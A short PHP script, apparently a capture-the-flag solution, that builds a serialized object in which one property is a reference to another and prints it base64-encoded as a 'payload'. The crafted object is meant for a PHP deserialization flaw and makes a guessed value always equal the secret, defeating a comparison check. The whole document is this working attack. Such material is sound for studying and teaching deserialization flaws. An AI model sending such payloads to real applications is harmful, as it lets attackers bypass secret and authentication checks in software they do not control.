<?php
class ob
{
    var $number_user;
    var $number_secret;
    function __construct() {
        $this->number_secret = &$this -> number_user;
    }
}

$payload = new ob();
echo base64_encode(serialize($payload));